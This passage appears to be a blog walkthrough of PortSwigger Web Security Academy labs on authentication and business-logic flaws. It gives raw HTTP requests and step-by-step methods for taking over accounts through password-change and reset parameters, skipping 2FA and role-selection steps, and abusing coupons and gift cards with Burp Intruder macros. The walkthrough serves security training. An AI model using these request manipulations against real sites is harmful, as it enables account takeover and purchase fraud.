User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36

csrf=jEV9rLFT2Whe6Gdv5xysswtviT67aIif&username=administrator&new-password-1=peter&new-password-2=peter
```

**Response**
```html
.
.
<header class="notification-header">
</header>
<h1>
	My Account
</h1>
<p class=is-warning>
	Current password is incorrect
</p>
<div id=account-content>
.
.
```

If we remove the `current password` completely they accept the request and change our password.

**Request**
```
POST /my-account/change-password HTTP/2
Host: 0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Cookie: session=Q59XR716BAzndFSKs4ZCBG2YlM1m0JCj
Content-Length: 95
Origin: https://0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36

csrf=jEV9rLFT2Whe6Gdv5xysswtviT67aIif&username=wiener&new-password-1=peter&new-password-2=peter
```

**Response**
```
.
.
<header class="notification-header">
</header>
<p>
	Password changed successfully!
</p>
.
.
```

Knowing this we can change the `Username` parameter value to `administrator` and remove the `current-passowrd` parameter completely to change the administrator password.

**Request**
```
POST /my-account/change-password HTTP/2
Host: 0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Cookie: session=Q59XR716BAzndFSKs4ZCBG2YlM1m0JCj
Content-Length: 102
Origin: https://0a4f00f7031e4eec80ca3aa800cc0009.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36

csrf=jEV9rLFT2Whe6Gdv5xysswtviT67aIif&username=administrator&new-password-1=peter&new-password-2=peter
```

**Response**
```html
<p>
	Password changed successfully!
</p>
```

Now the `administrator` password is changed logged in using that credentials to access the `administrator` account. This is a logic flaw that causes the application to be vulnerable to Authentication vulnerability.

### LAB #8: Password reset broken logic

Lab URL: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

**Given Credentials**

```
wiener:peter
```

Victim's Username
```
carlos
```

**Objective:** Exploit the password reset functionality to reset Carlos's user's password and log in to his account.

The site has a `/login` endpoint in which we can login to our account. There they also forgot the password functionality in which we can give our username and they sent the password reset link to his email client. The password reset link looks like the following
```url
https://0ad8002f031e11a1c1381280008e003e.web-security-academy.net/forgot-password?temp-forgot-password-token=FImsfxBXf4D0YSBu1w42jiOc6Rim7ApR
```

There we can give a New Password and Confirm the Password and its request looks like following

```
POST /forgot-password?temp-forgot-password-token=FImsfxBXf4D0YSBu1w42jiOc6Rim7ApR HTTP/2
Host: 0ad8002f031e11a1c1381280008e003e.web-security-academy.net
Cookie: session=QSaeCdd8cBWT4xKgDqZ2HaPXB24I4iFr
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: https://0ad8002f031e11a1c1381280008e003e.web-security-academy.net
Referer: https://0ad8002f031e11a1c1381280008e003e.web-security-academy.net/forgot-password?temp-forgot-password-token=FImsfxBXf4D0YSBu1w42jiOc6Rim7ApR

temp-forgot-password-token=FImsfxBXf4D0YSBu1w42jiOc6Rim7ApR&username=wiener&new-password-1=peter&new-password-2=peter
```

In the above request, we can see `username=wiener` has been given in the request if we change it with some other username i.e. `carlos` we can change its password and login into his account.

### Users won't always follow the intended sequence

Many applications and their functions may rely on some predefined workflows that consist of many steps to complete. For example, an ATM machine user first enters his credit card, then enters his pin number after that they may do any transactions or withdrawals. Applications may add some functionalities like that also in which they complete one step to move to another after that they get what he wants.

In that workflow sometimes the application won't force the step thinking user only go with intended sequences through a browser but the attacker just manually submits the request that didn't follow the previous workflow and due to that application may lead to some logic vulnerabilities.

### LAB #9: 2FA Simple bypass

Lab URL: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass

**Obtained Credentials**
```
wiener:peter
carlos:montoya
```

This lab contains a login form and an email client for `wiener` users. When we log in using the `wiener` user they sent the POST request to the `/login` endpoint and the request looks like this.
```
POST /login HTTP/2
Host: 0aae0022045642b2c00790de00220030.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://0aae0022045642b2c00790de00220030.web-security-academy.net
Referer: https://0aae0022045642b2c00790de00220030.web-security-academy.net/login2

username=wiener&password=peter
```

Their response looks like this.

```
HTTP/2 302 Found
Location: /login2
Set-Cookie: session=s0NR83jd3Ikb7ZO1l3pfuV6GSn0MQoZ9; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

They redirect us to the `/login2` endpoint and set a session cookie. The `/login2` endpoint generates an MFA code and is sent to our email client. when we use that code and sent the request our request looks like this.

```
POST /login2 HTTP/2
Host: 0aae0022045642b2c00790de00220030.web-security-academy.net
Cookie: session=s0NR83jd3Ikb7ZO1l3pfuV6GSn0MQoZ9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

mfa-code=1946
```

Its response looks like this

```
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=s0NR83jd3Ikb7ZO1l3pfuV6GSn0MQoZ9; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

 They check the MFA code and if that's correct they will redirect us to the `/my-account` endpoint if you see they have the same cookie that we get when we send a login to the `/login` endpoint. If the code doesn't match they show an error message `MFA-code is incorrect`.

Knowing this we send a `/login` request to the burp repeater and sent that request to the server. The `/login` request look like the following

```
POST /login HTTP/2
Host: 0aae0022045642b2c00790de00220030.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://0aae0022045642b2c00790de00220030.web-security-academy.net
Referer: https://0aae0022045642b2c00790de00220030.web-security-academy.net/login2

username=carlos&password=montoya
```

The server checks the credentials and issues a session cookie and redirects us to the `/login2` endpoint, we just copy the session cookie and now send the `/my-account` request to the repeater and change its cookie with the cookie we just copy and sent the request. The `/my-account` request will look like the following.

```
GET /my-account HTTP/2
Host: 0aae0022045642b2c00790de00220030.web-security-academy.net
Cookie: session=[Copied Session Cookie Here]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
```

We will see the server show us the account dashboard of the `carlos` user. We see there the application logic doesn't enforce the steps on the server side and that leads to the 2-factor authentication bypassed.

### LAB #10: Insufficient workflow validation

**Given Credentials:**

```
wiener:peter
```

**Objective:**

Exploit the logic flaw to buy the `l33t leather jacket`.


This lab has a shopping application where they have multiples product to sell. We can login to our account by sending a `POST` request to the `/login` endpoint like the following.

```
POST /login HTTP/2
Host: 0a10000a046e206d84922e4f006a00a6.web-security-academy.net
Cookie: session=rSe8O5TKscjDPXRQevpVGgV8dqsdTXHb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

csrf=eWeGZ0gPS1VkhqoNBCDREfnJ5W873goS&username=wiener&password=peter
```

We have total `$100.00` credits in our account and the product `l33t Leather jacket` price is `$1337.00`. If we send that into our cart and place the order the redirects us to `/cart?err=INSUFFICIENT_FUNDS` which shows we don't have enough credit to buy it. The whole request looks like the following.

**Request:**

```
POST /cart/checkout HTTP/2
Host: 0a10000a046e206d84922e4f006a00a6.web-security-academy.net
Cookie: session=hiI066wLU3cDgJBxTYoeYTzYBAZnkBEZ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

csrf=KhBg5O9xsfDnA6AO9fx4oHNtCgDZ4lvO
```

**Response:**

```
HTTP/2 303 See Other
Location: /cart?err=INSUFFICIENT_FUNDS
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

But when we send a product that has less price i.e. Eye Projectors only `$25.55` and place the order they redirect us to the `/cart/order-confirmation?order-confirmed=true` endpoint that places our order. The whole request is like the following.

**Request:**

```
POST /cart/checkout HTTP/2
Host: 0a10000a046e206d84922e4f006a00a6.web-security-academy.net
Cookie: session=hiI066wLU3cDgJBxTYoeYTzYBAZnkBEZ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

csrf=KhBg5O9xsfDnA6AO9fx4oHNtCgDZ4lvO
```

**Response:**

```
HTTP/2 303 See Other
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

By seeing that I think the application on the backend is like the following.

1. User sends the product to `/cart`.
2. User places an order in the `/cart` endpoint and then the server checks the product price and the user's available credits.
3. If the user has enough credit then they cut the amount in his wallet and redirect him to the`/cart/order-confirmation?order-confirmed=true` endpoint that checks its cart and place its order. Otherwise, redirect him to the `/cart?err=INSUFFICIENT_FUNDS` endpoint that shows him an error.

Knowing all that we can send the `l33t Leather Jacket` in our cart and instead of Placing the order just send the `GET` request to the `/cart/order-confirmation?order-confirmed=true` endpoint that places the order without checking the user balance and cutting any amount just place the order for all the product in his cart.

### LAB #11: Authentication bypass via flawed state machine

**Given Credentials:**
```
wiener:peter
```

**Objective:**
Exploit the logic flaw in the sequence of events in the login process that gives the user administrator access and delete the user carlos with that.

The lab contains a shopping application that contains some products to sell. We see the details of our account by going to the `/my-account` endpoint. If we are logged in then they show us the details otherwise they redirect us to the `/login` page where we can login to our account by giving the `username` and `password` combination. If any of them are incorrect then they show an error message other wise they redirect us to the `/role-selector` endpoint where we can select our roles from `user` to `content-author`. All sequences of requests and responses are like the following.

**Request: GET /my-account**

```
GET /my-account HTTP/2
Host: 0a700091034f858680257bf8008e0045.web-security-academy.net
Cookie: session=bhzk3qWhpbnseAZW2XuH3Ym47Fd1Z0SM
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
```

**Response: GET /my-account**

```
HTTP/2 302 Found
Location: /login
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

**Request: POST /login**

```
POST /login HTTP/2
Host: 0a700091034f858680257bf8008e0045.web-security-academy.net
Cookie: session=bhzk3qWhpbnseAZW2XuH3Ym47Fd1Z0SM
Content-Length: 68
Origin: https://0a700091034f858680257bf8008e0045.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=efMf0kyOEphOzAg0xzAXICm0ydjZiTxI&username=wiener&password=peter
```

**Response: POST /login**

```
HTTP/2 302 Found
Location: /role-selector
Set-Cookie: session=JUfXQL8abrQifKBm5ZG2WrMSwX4lA1O4; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

**Request: GET /role-selector**

```
GET /role-selector HTTP/2
Host: 0a700091034f858680257bf8008e0045.web-security-academy.net
Cookie: session=JUfXQL8abrQifKBm5ZG2WrMSwX4lA1O4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
```

**Response: GET /role-selector**

```html
[Redacted]
.
.
<form class=login-form method=POST>
	<p>Please select a role</p>
		<select name=role>
			<option value='user'>User</option>
			<option value='content-author'>Content author</option>
		</select>
	<input required type="hidden" name="csrf" value="6JY06bTE6OIQ4QXcgRxxJH4yiVPcYZmq">
<button class=button type=submit>Select</button>
</form>
.
.
[Redacted]
```

**Request: POST /role-selector**

```
POST /role-selector HTTP/2
Host: 0a700091034f858680257bf8008e0045.web-security-academy.net
Cookie: session=M4lbhcWpHsIoDe8KSt0j1bFfjhfCQ1ME
Content-Length: 47
Origin: https://0a700091034f858680257bf8008e0045.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

role=user&csrf=6JY06bTE6OIQ4QXcgRxxJH4yiVPcYZmq
```

**Response: POST /role-selector**

```
HTTP/2 302 Found
Location: /
Set-Cookie: session=yXXYdI6G2hRonMXJfmtUP1WnSy27xhDI; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

In the above sequence of request/response, we see the user first login into his account, and when they successfully login the server issue a session cookie for him and redirect him to the role selector. When select his role the server issued him a new session cookie this time and redirect him to `/` the root of the website that in short its Home page. There we can either see product details or go to the `/my-account` endpoint to see our current account details.

For logic flaws, we see the following steps in login functionality.

- Login using the correct credentials
- Get a role selection page
- Pick a role
- Access the account

So what if we don't pick a role, we just skip that process and browser the application normally? Did the application work normally or give us any error or something? let's test it.

First, send a login request to the server.

**Request:**
```
POST /login HTTP/2
Host: 0a700091034f858680257bf8008e0045.web-security-academy.net
Cookie: session=EgxtFeR98zkw7VPiXa5z8fhOYAgbM0Yc
Content-Length: 68
Origin: https://0a700091034f858680257bf8008e0045.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=nxXsVRvV9fNzQuMVX8OqQYmjKKeIW6My&username=wiener&password=peter
```

**Response:**

```
HTTP/2 302 Found
Location: /role-selector
Set-Cookie: session=WOzYTDGCzQYRxntwkutrFZ1F0lMU2l7N; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

After this request, they redirect us to `/role-picker`, Intercept that request and click the drop button in your burp. That way server didn't will get any requests for `role-selector` and doesn't issue any cookies. Now manually go to the `/my-account` page and see did they give you any error or just redirect you to the `/login` page again.

When we go to `/my-account` after dropping the `GET /role-selector` request they don't redirect us to `/login` instead we are login but to an `administrator` user. There you go to the admin panel to delete user `carlos` to solve the lab.

In this lab we see a logic flaw in the user doesn't follow the intended sequence all the time so without forcing the intended steps that will lead to logic vulnerabilities. 

## Domain-specific flaws

Domain Specific flaws are those that are specific to the domain or industry in which the web application operates. In other words, these vulnerabilities are unique to a particular business or market segment and are not applicable to other domains.

For **example**, Consider a web application that allows users to book hotel rooms. A domain-specific flaw in this application might be that it does not enforce a minimum stay requirement during high season or special events, which could lead to overbooking or other issues for the hotel. This type of flaw is specific to the hotel booking domain and would not be relevant to other industries.

Let's take another **example**, An online shop that offers a 10% discount on orders over $1000. This could be vulnerable to abuse if the business logic fails to check whether the order was changed after the discount is applied. In this case, an attacker could simply add items to their cart until they hit the $1000 threshold, then remove the items they don't want before placing the order. They would then receive a discount on their order even though it no longer satisfies the intended criteria.

Other examples of domain-specific flaws might include:

1. In an e-commerce web application, failing to account for taxes or shipping costs in the checkout process, could lead to incorrect order totals or shipping delays.
2. In a healthcare web application, failing to properly handle patient data, such as failing to encrypt sensitive data or allowing unauthorized access to patient records.
3. In a financial web application, failing to properly validate or handle financial transactions, which could lead to unauthorized or incorrect transactions.

For testing those kinds of flaws we should pay particular attention in any situation where prices are adjusted based on a particular event to occur or some criteria are meant or by manipulating the application so that it is in a state where the applied adjustments do not correspond to the original criteria intended by the developers.

Having knowledge and understanding of the backend algorithm is very useful in testing that kind of vulnerability. Without this knowledge of the domain, you may dismiss dangerous behavior because you simply aren't aware of its potential knock-on effects. Likewise, you may struggle to join the dots and notice how two functions can be combined in a harmful way. 

For simplicity, the examples used in this topic are specific to a domain that all users will already be familiar with, namely an online shop. However, whether you're bug bounty hunting, Pentesting, or even just a developer trying to write more secure code, you may at some point encounter applications from less familiar domains. In this case, you should read as much documentation as possible and, where available, talk to subject-matter experts from the domain to get their insight. This may sound like a lot of work, but the more obscure the domain is, the more likely other testers will have missed plenty of bugs. These kinds of vulnerabilities are very difficult to find but often have a very high impact on business.

### LAB #12: Flawed enforcement of business rules

Lab URL: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules

**Given Credentials:**
```
wiener:peter
```

**Objective:**

Exploit the Logic flaw in the website purchasing workflow to buy a "Lightweight l33t leather jacket".

This lab contains a shopping application that has a different number of products to sell. We can login into our account, and we have $100 of credit in our account to buy things. On visiting we also see a Header that says the following.

```
New customers use the code at checkout: NEWCUST5
```

They provide us a discount coupon code that when we send a `Lightweight l33t leather jacket in our cart that has a price `of $1337` and use the coupon code in our cart they cut  $5 and now our update price is `$1332`. The request coupon request looks like the following.

```
POST /cart/coupon HTTP/2
Host: 0a6a00a404a3ee00807ea3a10092002c.web-security-academy.net
Cookie: session=lXhXMFKEykiilGkdWnk8wdBTxlx7Bhmy
Content-Length: 53
Origin: https://0a6a00a404a3ee00807ea3a10092002c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=quxigk99HRgMEyFqmDMVaPJnliB5U4QW&coupon=NEWCUST5
```

When we use the same coupon code again they show us the following error message.

```
Coupon already applied
```

By scrolling the website's Home Page I see in the footer they add a newsletter functionality also there we can give our email to subscribe to its newsletter. The newsletter request is like the following.

```
POST /sign-up HTTP/2
Host: 0a6a00a404a3ee00807ea3a10092002c.web-security-academy.net
Cookie: session=lXhXMFKEykiilGkdWnk8wdBTxlx7Bhmy
Content-Length: 62
Origin: https://0a6a00a404a3ee00807ea3a10092002c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=quxigk99HRgMEyFqmDMVaPJnliB5U4QW&email%2F=test%40test.com
```

After sending the above command in its response an alert box is pop up that has the following message.

```
Use coupon SIGNUP30 at checkout!
```

They give us another coupon code this time and when I add that to our cart they cut `$401.10` in our cart and now our updated price is `$930.90`. Again when I use the same coupon code again they show us the error message like before but when we use the previous code `NEWCUST5` they accept it and vice versa after that they accept the `SIGNUP30` coupon code also without giving any error message.

There the application isn't properly able to validate whether the coupon code is already in use or not. and that leads to him being vulnerable. Knowing all that send the coupon request to burp intruder and add the payload position into only coupon code like the following.

```
POST /cart/coupon HTTP/2
Host: 0a6a00a404a3ee00807ea3a10092002c.web-security-academy.net
Cookie: session=lXhXMFKEykiilGkdWnk8wdBTxlx7Bhmy
Content-Length: 53
Origin: https://0a6a00a404a3ee00807ea3a10092002c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=quxigk99HRgMEyFqmDMVaPJnliB5U4QW&coupon=§NEWCUST5§
```

Select the Attack Type as Sniper and in the Payloads tab use Payload type as Simple list, and just paste the following payloads in Simple list.

```
SIGNUP30
NEWCUST5
SIGNUP30
NEWCUST5
```

Paste that multiple times so that we got a price that we can buy the `Lightweight l33t leather jacket` and start the attack. After the attack is finished reload the `/cart` page and you will see your cart price become either zero or in between `$100.00` so you can buy it if not then send some more requests to achieve it and buy the jacket to solve the lab.

### LAB #13: Infinite money logic flaw

**Given Credentials:**
```
wiener:peter
```

**Objective:**

Exploit the logic flaw in the purchasing workflow to buy a `Lightweight l33t jacket`.

This lab contains a shopping application that has many products to sell. We can login to our account, and after that, we can send a product to our cart and buy it. We only have a `$100` credit in our account and our goal is to buy a `l33t Leather jacket` that has a price of `$1337`. In the cart, we can add a coupon code for a discount and also we can redeem a gift code also to add credit to our account.

At the bottom of the application, there is a newsletter functionality in which we can register for the app newsletter by giving him our email address. After registering for the newsletter an alert box pops up that has a discount coupon code `SIGNUP30` that gives us a `30%` discount if we add it to our cart. Going back to the products we see there is a product name `Gift Card` that is only for `$10`, We can buy it and also add a discount coupon that updates the price and now they are only for `$7`.

After checkout, they show us a gift code and they send that code to our email client. We can use that gift code from the `My account` section and after that we see our account balance is incremented to `$103` dollars because the gift code adds `$10` to our account. This is a logic flaw that we can use to increase our account balance.

Now we know we can increase our account balance but it takes the following steps to complete to increment only `$3` in our account.

1. Sending the POST request to `/cart` that adds the `Gift Card` product to our cart.

```
POST /cart HTTP/2
Host: 0a5d004803c2427380ec4445001d0055.web-security-academy.net
Cookie: session=H1WfXAaNBsJIx9F1tge9DK92Pev9DU85
Content-Length: 36
Origin: https://0a5d004803c2427380ec4445001d0055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

productId=2&redir=PRODUCT&quantity=1
```

2. Sending a POST request to `/cart/coupon` to add a coupon code to our cart

```
POST /cart/coupon HTTP/2
Host: 0a5d004803c2427380ec4445001d0055.web-security-academy.net
Cookie: session=H1WfXAaNBsJIx9F1tge9DK92Pev9DU85
Content-Length: 53
Origin: https://0a5d004803c2427380ec4445001d0055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=sZTOsS4diAXcwFKGlCsKjXxBpGf23Thq&coupon=SIGNUP30
```

3. Sending a POST request to `/cart/checkout` to place the order

```
POST /cart/checkout HTTP/2
Host: 0a5d004803c2427380ec4445001d0055.web-security-academy.net
Cookie: session=H1WfXAaNBsJIx9F1tge9DK92Pev9DU85
Content-Length: 37
Origin: https://0a5d004803c2427380ec4445001d0055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=sZTOsS4diAXcwFKGlCsKjXxBpGf23Thq
```

4. Send the GET request to `/cart/order-confirmation?order-confirmed=true` to fetch the coupon code.

```
GET /cart/order-confirmation?order-confirmed=true HTTP/2
Host: 0a5d004803c2427380ec4445001d0055.web-security-academy.net
Cookie: session=H1WfXAaNBsJIx9F1tge9DK92Pev9DU85
Origin: https://0a5d004803c2427380ec4445001d0055.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
```

5. Send the POST request to `/gift-code` to redeem the gift code.

```
POST /gift-card HTTP/2
Host: 0a5d004803c2427380ec4445001d0055.web-security-academy.net
Cookie: session=H1WfXAaNBsJIx9F1tge9DK92Pev9DU85
Content-Length: 58
Origin: https://0a5d004803c2427380ec4445001d0055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=sZTOsS4diAXcwFKGlCsKjXxBpGf23Thq&gift-card=mUZn99BufQ
```

Sending all the previous request manually take a lot of time to achieve `$1337` so we have to automate this process and fortunately, we can easily do that using Burp Suite. We use Burp Session Handling and Macro feature to automate the whole process they are still slow but they are much better than just doing it manually. Follow the following steps to create a session handling rule and Macro in Burp Suite.

1. Go to the Burp Session handling rule section and Click the `Add` button.

> **Note:** If you don't know where it is then use Burp suite's latest Documentation to find its location.

2. `[Optional]` Name the rule.
3. Click the `Add` button and select the `Run a macro` option.
4. Dialog box will open there click the `Add` button again to create and Add a new Macro.
5. A new Dialog box will open that has all the results in your proxy history in which you have to select all the following requests.
	1. `POST /cart`
	2. `POST /cart/coupon`
	3. `POST /cart/checkout`
	4. `GET /cart/order-confirmation?order-confirmed=true`
	5. `POST /gift-card`

> **Note:** If your proxy history doesn't have all the above requests then first add that request to your proxy history by manually Placing an order and adding the gift card to your account while your traffic is proxy-ed through Burp Suite.

> **Note:** Select all the above requests carefully, All the above requests should be like the example raw requests that I showed above.

6. When all the above requests are added in your Macro Editor then select the `GET /cart/order-confirmation?order-confirmed=true` request and click on the `Configure Item` button from the right side.
7. This will open a dialog box that has two boxes one is `Parameter handling` and the other one is `Custom parameter location in response`. In the other one click on the `Add` button to add a custom parameter. This will open a new dialog box there Add the `gift-code` as a parameter name and in the HTTP response scroll down until you see a gift code highlight it and click OK twice to go back to Macro Editor. This will generate a Custom parameter from the response that has the gift code that we can use in our next request.
8. Now select the `POST /gift-code` request and click on the `Configure Item` button. There you will see the parameter `gift-code` in the Parameter Handling section. Change its setting from `Use Preset value` to `Derive from prior response` and select the other options to `Response 4` because that is our previous request `GET /cart/order-confirmation?order-confirmed=true` that has the coupon code. Click on the OK button to go back to the macro editor.

Going all the processes correctly will automatically send all the requests we can test it using clicking on the `Test Macro` button which sends all the requests again and shows us the latest response they get. If everything going well you will see the status `302` to your `POST /gift-cart` request without any error in its response is so then click the OK button to go back to the session handling rule dialog box. if you got that result then congratulations you have completed the difficult part of configuring the macro and now we move on to other but easy steps.

In the session handling rule go to the Scope tab and check only `Intruder` as tool scope and in the URL scope check only the `Include all URLs` option and click OK. Now send the `GET /my-account` request to the intruder and chose Attack Type as Sniper and then go to the Payloads tab and select Payload Type as Null Payload, and Generate `400` payload. Now go to `Resource Pool` and click on the new resource pool name it and select Maximum concurrent request and make its value 1 that will only send one request at a time. Now go to the Settings tab and scroll down to Grep - Extract option and click Add button there highlight the account credit in the HTTP response and click OK, now click the Start Attack button to start the attack.

You will see your current balance in the intruder response that is increasing wait until you have more than `$1337` then close the attack and send the `l33t leather jacket` to your cart and buy it to solve the lab.

### Encryption oracle

Business Applications may encrypt user data/input in some manner but some dangerous scenarios can occur when that encrypted and decrypted data is available to the user in any context.

Encryption required either a key pair i.e. Asymmetric key encryption or Required just a single key i.e. symmetric key to encrypt/decrypt that user-controllable data. That key is stored in the backend or hard-coded into the application source code and without that key, no one can decrypt the encrypted data.

If the application show cipher text to the user and in some other functionality that data can be decrypted to plain text. That functionality could be abused by the attacker to encrypt its input and use that to pass through some application logic that could lead to some unintended circumstances or decrypt some other users' confidential data. This type of logic flaw is known by the name **Encryption Oracle**.

### LAB #14: Authentication Bypass via Encryption Oracle

This lab contains a blog website that has many blogs on different topics, we can read it and comment on it that sending a POST request to the `/post/comment` endpoint. The comment request looks like the following.

```
POST /post/comment HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Content-Length: 115
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=1ZpScPxGtOoClDTxYdBXbNkxWFvMUrO4&postId=8&comment=hello+world+small&name=wiener&email=temp%40temp.com&website=
```

There is an endpoint `/my-account` in which we can see our account details if we are logged in otherwise they redirect us to the `/login` endpoint in which we can login to our account by giving a username and password combination. The login request and its response look like the following.

**Request**
```
POST /login HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Cookie: session=yx6qfg29ZZwrcsMWMMOt6SnGSwvbDskT
Content-Length: 68
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=WoRWFFP1DBMIGWfKlXI79UiDNZSIQkI0&username=wiener&password=peter
```

**Response**
```
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=eAy761KCGIvRbmxKSAzwL4NFcu1PSC67; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

There is also a checkmark in the `/login` endpoint for stay login which preserve our session for some time and we don't need to login again. Their request looks like the following.

**Request**
```
POST /login HTTP/2
Host: 0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Cookie: session=gvzWSqSR0d9actRHpb9W8zLJ7YGJUdtz
Content-Length: 86
Origin: https://0ac7004b0374c51b81b4f24a00d0007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36

csrf=FelcFndOWuwZBmjnbKMfTKoM0JDJtRV6&username=wiener&password=peter&stay-logged-in=on
```

**Response**
```
HTTP/2 302 Found
Location: /my-account
Set-Cookie: stay-logged-in=Up6SUkm%2fm0EuyIQRjnpvg1xyRJWVjloOcsD2zeJJGIc%3d; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=ZpV6BvtqY77YoHYPizYO0Xna4rYDB9V7; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

We see in the stay logged-in request they add an additional cookie with the name `stay-login`. Their value looks like in URL and base64 encoding but after decoding they didn't show any readable results.

